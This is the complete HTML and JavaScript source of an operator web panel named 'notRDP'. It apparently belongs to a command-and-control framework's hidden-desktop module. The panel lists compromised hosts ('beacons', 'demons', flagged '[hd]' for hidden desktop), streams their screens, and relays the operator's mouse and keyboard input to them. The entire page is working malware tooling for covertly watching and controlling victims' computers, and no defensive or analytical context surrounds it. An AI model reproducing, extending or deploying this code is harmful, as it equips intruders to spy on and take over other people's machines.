<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>notRDP</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  background:#0b1120;
  color:#b8c4d4;
  font-family:'Cascadia Code','Fira Code','Consolas','SF Mono','Liberation Mono',monospace;
  font-size:12px;
  height:100vh;
  display:flex;
  flex-direction:column;
  overflow:hidden;
}

.toolbar{
  background:#0f1628;
  border-bottom:1px solid #1a2540;
  padding:0 14px;
  display:flex;
  align-items:center;
  gap:10px;
  height:42px;
  flex-shrink:0;
}

.brand{
  font-size:14px;
  font-weight:700;
  letter-spacing:1px;
  color:#3b8ef8;
  margin-right:6px;
  text-transform:uppercase;
  user-select:none;
}

.toolbar select{
  background:#111b30;
  border:1px solid #1e3055;
  color:#8fa4c0;
  padding:5px 10px;
  border-radius:3px;
  font:inherit;
  font-size:11px;
  cursor:pointer;
  min-width:160px;
  outline:none;
  transition:border-color .2s;
}
.toolbar select:focus{border-color:#3b8ef8}

.tb-btn{
  border:1px solid #1e3055;
  padding:5px 14px;
  border-radius:3px;
  font:inherit;
  font-size:11px;
  cursor:pointer;
  transition:all .15s;
  background:#111b30;
  color:#6b7f9a;
  white-space:nowrap;
  line-height:1;
}
.tb-btn:hover{background:#162240;color:#b0c4e0;border-color:#2a4070}
.tb-btn:active{background:#1a2850}

.btn-start{color:#34d399;border-color:#134030}
.btn-start:hover{background:#0f2a20;color:#5eead4;border-color:#1a5040}

.btn-stop{color:#f87171;border-color:#401313}
.btn-stop:hover{background:#2a0f0f;color:#fca5a5;border-color:#5a1a1a}

.btn-fs{padding:5px 8px;font-size:13px}

.spacer{flex:1}

.status-text{
  font-size:10px;
  color:#364060;
  letter-spacing:.5px;
}
.status-text.live{color:#34d399}

.screen-area{
  flex:1;
  background:#080d18 url('/bg.png') center center / 40% auto no-repeat;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
  position:relative;
  user-select:none;
  cursor:crosshair;
}
.screen-area img{display:block}
.screen-area .placeholder{
  color:#1a2545;
  font-size:13px;
  text-align:center;
  line-height:2;
  pointer-events:none;
  letter-spacing:.5px;
}

.click-ripple{
  position:absolute;
  width:20px;height:20px;
  border-radius:50%;
  border:2px solid #3b8ef8;
  pointer-events:none;
  animation:ripple .35s ease-out forwards;
  z-index:10;
}
@keyframes ripple{
  0%{transform:translate(-50%,-50%) scale(.4);opacity:.8}
  100%{transform:translate(-50%,-50%) scale(2);opacity:0}
}

@media(max-width:600px){
  .toolbar{padding:0 8px;gap:6px;height:38px}
  .tb-btn{padding:4px 8px;font-size:10px}
  .brand{font-size:12px}
}
</style>
</head>
<body>

<div class="toolbar">
  <span class="brand">notRDP</span>
  <select id="demonSel"><option value="">select beacon</option></select>
  <button class="tb-btn btn-start" onclick="HVS.startStream()">&#9654; start</button>
  <button class="tb-btn btn-stop" onclick="HVS.stopStream()">&#9632; stop</button>
  <button class="tb-btn btn-fs" onclick="HVS.toggleFullscreen()" title="Fullscreen">&#9974;</button>
  <span class="spacer"></span>
  <span class="status-text" id="status">idle</span>
</div>

<div class="screen-area" id="screenArea" tabindex="0">
  <img id="screenImg" style="display:none" draggable="false">
  <div class="placeholder" id="placeholder">select a beacon and press start</div>
</div>

<script>
(function(){
  'use strict';

  var API = window.location.origin;
  var activeDemon = '';
  var lastMtime = 0;
  var frameTimes = [];
  var fpsInterval = null;
  var latencyMs = 0;
  var lastFrameBytes = 0;

  var $sel, $img, $ph, $status, $area;

  function $(id){ return document.getElementById(id); }

  function init(){
    $sel = $('demonSel');
    $img = $('screenImg');
    $ph = $('placeholder');
    $status = $('status');
    $area = $('screenArea');

    refreshDemons();
    setInterval(refreshDemons, 5000);
    setupInput();
    window.addEventListener('resize', resizeImage);
  }

  function refreshDemons(){
    fetch(API + '/api/demons').then(function(r){ return r.json(); }).then(function(list){
      var prev = $sel.value;
      $sel.innerHTML = '<option value="">select beacon</option>';
      list.forEach(function(d){
        var opt = document.createElement('option');
        opt.value = d.id;
        var label = d.id;
        if(d.streaming) label += ' [live]';
        if(d.hidden_desktop) label += ' [hd]';
        opt.textContent = label;
        if(d.id === prev) opt.selected = true;
        $sel.appendChild(opt);
      });
    }).catch(function(){});
  }

  async function longPollFrame(){
    if(!activeDemon) return;
    var t0 = performance.now();
    try {
      var url = API + '/api/frame/' + activeDemon + '?after=' + lastMtime;
      var r = await fetch(url);
      if(r.status === 304){ requestAnimationFrame(longPollFrame); return; }
      if(!r.ok) throw new Error('no frame');
      var mt = r.headers.get('X-Frame-Time');
      if(mt) lastMtime = parseFloat(mt);
      lastFrameBytes = parseInt(r.headers.get('Content-Length') || '0', 10);
      var blob = await r.blob();
      latencyMs = performance.now() - t0;
      var objUrl = URL.createObjectURL(blob);
      var prev = $img.src;
      $img.src = objUrl;
      if(prev && prev.startsWith('blob:')) URL.revokeObjectURL(prev);
      frameTimes.push(performance.now());
      if(frameTimes.length > 60) frameTimes.shift();
    } catch(e) {
      await new Promise(function(resolve){ setTimeout(resolve, 200); });
    }
    requestAnimationFrame(longPollFrame);
  }

  function startStream(){
    var did = $sel.value;
    if(!did){ alert('Select a beacon first'); return; }
    activeDemon = did;
    lastMtime = 0;
    $ph.style.display = 'none';
    $img.style.display = 'block';
    $status.textContent = 'streaming: ' + did;
    $status.className = 'status-text live';
    frameTimes = [];
    longPollFrame();
    $area.focus();
  }

  function stopStream(){
    activeDemon = '';
    $img.style.display = 'none';
    $ph.style.display = '';
    $status.textContent = 'idle';
    $status.className = 'status-text';
    frameTimes = [];
  }

  function resizeImage(){
    var nw = $img.naturalWidth;
    var nh = $img.naturalHeight;
    if(!nw || !nh) return;
    var ar = $area.getBoundingClientRect();
    var scale = Math.min(ar.width / nw, ar.height / nh);
    $img.style.width = Math.floor(nw * scale) + 'px';
    $img.style.height = Math.floor(nh * scale) + 'px';
  }

  function toggleFullscreen(){
    if(!document.fullscreenElement){
      $area.requestFullscreen().catch(function(){});
    } else {
      document.exitFullscreen().catch(function(){});
    }
  }

  function getCoords(e){
    var r = $img.getBoundingClientRect();
    var nw = $img.naturalWidth || 1;
    var nh = $img.naturalHeight || 1;
    var x = Math.round((e.clientX - r.left) / r.width * nw);
    var y = Math.round((e.clientY - r.top) / r.height * nh);
    return {
      x: Math.max(0, Math.min(nw - 1, x)),
      y: Math.max(0, Math.min(nh - 1, y))
    };
  }

  function showRipple(e){
    var rip = document.createElement('div');
    rip.className = 'click-ripple';
    rip.style.left = e.clientX + 'px';
    rip.style.top = e.clientY + 'px';
    $area.appendChild(rip);
    setTimeout(function(){ rip.remove(); }, 350);
  }

  function sendInput(data){
    if(!activeDemon) return;
    data.demon_id = activeDemon;
    fetch(API + '/api/input', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).catch(function(){});
  }

  var EXTENDED_KEYS = {33:1,34:1,35:1,36:1,37:1,38:1,39:1,40:1,44:1,45:1,46:1,91:1,92:1,93:1,111:1,144:1};

  function getExtFlags(e){
    if(e.location === 2 && e.keyCode !== 16) return 1;
    if(e.keyCode === 13 && e.location === 3) return 1;
    return EXTENDED_KEYS[e.keyCode] ? 1 : 0;
  }

  var _dblClickTime = 0;
  var _lastMouseX = 0, _lastMouseY = 0;
  var _drag = {state:'idle', btn:0, sx:0, sy:0};
  var _suppressClick = false;
  var _moveThrottle = null;
  var _pendingMove = null;

  function sendThrottledMove(x, y){
    if(_moveThrottle){
      _pendingMove = {x:x, y:y};
      return;
    }
    sendInput({input_type:'mouse', action:'move', x:x, y:y});
    _pendingMove = null;
    _moveThrottle = setTimeout(function(){
      _moveThrottle = null;
      if(_pendingMove){
        sendInput({input_type:'mouse', action:'move', x:_pendingMove.x, y:_pendingMove.y});
        _pendingMove = null;
      }
    }, 30);
  }

  function setupInput(){
    $area.addEventListener('mousedown', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      e.preventDefault();
      $area.focus();
      var c = getCoords(e);
      _lastMouseX = c.x; _lastMouseY = c.y;
      _drag = {state:'pending', btn:e.button, sx:c.x, sy:c.y};
      _suppressClick = false;
    });

    $area.addEventListener('mousemove', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      var c = getCoords(e);
      _lastMouseX = c.x; _lastMouseY = c.y;
      if(_drag.state === 'pending'){
        var dx = Math.abs(c.x - _drag.sx);
        var dy = Math.abs(c.y - _drag.sy);
        if(dx > 3 || dy > 3){
          _drag.state = 'dragging';
          _suppressClick = true;
          var act = _drag.btn === 2 ? 'rightdown' : 'down';
          sendInput({input_type:'mouse', action:act, x:_drag.sx, y:_drag.sy});
        }
      }
      if(_drag.state === 'dragging'){
        sendThrottledMove(c.x, c.y);
      }
    });

    $area.addEventListener('mouseup', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      var c = getCoords(e);
      _lastMouseX = c.x; _lastMouseY = c.y;
      if(_drag.state === 'dragging'){
        var act = _drag.btn === 2 ? 'rightup' : 'up';
        sendInput({input_type:'mouse', action:act, x:c.x, y:c.y});
      }
      _drag.state = 'idle';
    });

    $area.addEventListener('click', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      if(_suppressClick){ _suppressClick = false; return; }
      if(Date.now() - _dblClickTime < 400) return;
      var c = getCoords(e);
      sendInput({input_type:'mouse', action:'click', x:c.x, y:c.y});
      showRipple(e);
    });

    $area.addEventListener('contextmenu', function(e){
      e.preventDefault();
      if(!activeDemon || $img.style.display === 'none') return;
      if(_suppressClick){ _suppressClick = false; return; }
      var c = getCoords(e);
      sendInput({input_type:'mouse', action:'rightclick', x:c.x, y:c.y});
      showRipple(e);
    });

    $area.addEventListener('dblclick', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      _dblClickTime = Date.now();
      _suppressClick = true;
      var c = getCoords(e);
      sendInput({input_type:'mouse', action:'dblclick', x:c.x, y:c.y});
    });

    $area.addEventListener('wheel', function(e){
      if(!activeDemon || $img.style.display === 'none') return;
      e.preventDefault();
      var c = getCoords(e);
      var delta = -Math.sign(e.deltaY) * 120;
      sendInput({input_type:'mouse', action:'scroll', x:c.x, y:c.y, keycode:delta});
    }, {passive:false});

    document.addEventListener('keydown', function(e){
      if(!activeDemon) return;
      if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
      if($area.contains(document.activeElement) || document.activeElement === document.body){
        e.preventDefault();
        e.stopPropagation();
        sendInput({input_type:'keyboard', action:'down',
          keycode:e.keyCode, flags:getExtFlags(e),
          x:_lastMouseX, y:_lastMouseY});
      }
    });

    document.addEventListener('keyup', function(e){
      if(!activeDemon) return;
      if(e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
      if($area.contains(document.activeElement) || document.activeElement === document.body){
        e.preventDefault();
        e.stopPropagation();
        sendInput({input_type:'keyboard', action:'up',
          keycode:e.keyCode, flags:getExtFlags(e),
          x:_lastMouseX, y:_lastMouseY});
      }
    });
  }

  function onImgLoad(){
    resizeImage();
  }

  window.HVS = {
    startStream: startStream,
    stopStream: stopStream,
    toggleFullscreen: toggleFullscreen
  };

  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', function(){
      init();
      $img.addEventListener('load', onImgLoad);
    });
  } else {
    init();
    $img.addEventListener('load', onImgLoad);
  }
})();
</script>
</body>
</html>
